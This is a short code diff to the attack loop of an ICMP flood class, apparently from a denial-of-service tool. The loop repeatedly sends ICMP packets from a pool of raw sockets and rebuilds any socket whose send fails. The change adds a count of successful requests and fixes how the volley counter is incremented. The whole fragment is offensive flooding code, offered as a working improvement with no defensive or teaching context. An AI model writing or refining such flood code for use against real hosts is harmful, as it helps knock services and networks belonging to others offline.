@@ -58,9 +58,11 @@ void ICMP_Flood::attack() {
             if((static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
+            }else{
+                (*conf->req)++;
             }
         }
-        conf->voly++;
+        (*conf->voly)++;
         pause();
     }
 }
